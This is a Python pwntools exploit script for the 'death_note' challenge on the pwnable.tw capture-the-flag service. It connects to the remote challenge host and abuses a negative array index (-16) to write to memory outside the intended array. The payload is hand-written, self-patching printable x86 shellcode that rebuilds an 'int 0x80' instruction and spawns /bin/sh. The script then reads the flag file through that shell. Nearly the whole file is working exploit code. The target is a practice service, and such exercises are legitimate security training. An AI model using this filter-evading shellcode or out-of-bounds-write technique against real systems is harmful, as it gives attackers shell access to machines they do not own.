#!/usr/bin/env python3
from pwn import *

PORT = 10201
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./death_note', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x080487D3
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

def sa(pr, data):
	p.sendlineafter(pr, data)

def menu(opt):
	sa(b'Your choice :', str(opt).encode())

def add(idx, name):
	menu(1)
	sa(b'Index :', str(idx).encode())
	sa(b'Name :', name)

sc = asm('''
	/* ebx = esp -> '/bin///sh\x00' */
	push 0x68
	push 0x732f2f2f
	push 0x6e69622f
	push esp
	pop ebx

	/*
  		edx contains the address returned by strdup, 
      	which is the start address of this shellcode.
     */
	push edx
	pop eax

	/*
     	Patch byte 0x2c:
     	0x20 - 0x53 = 0xcd
     	Patch byte 0x2d:
     	(0x43 - 0x53) ^ 0x70 = 0x80
     */
	push 0x53
	pop edx
	sub byte ptr [eax + 0x2c], dl
	sub byte ptr [eax + 0x2d], dl

	push 0x70
	pop edx
	xor byte ptr [eax + 0x2d], dl


	/*
	ecx = edx = 0, eax = 0x0b
	*/
	push 0x30
	pop eax
	xor al, 0x30

	push eax
	pop ecx

	push ecx
	pop edx

	xor al, 0x2b
	xor al, 0x20

	/*Patch to int 0x80*/
	.byte 0x20, 0x43

	''', arch = 'i386')

add(-16, sc)
p.sendline(b'cat /home/death_note/flag')

p.interactive()

# d1nhdwc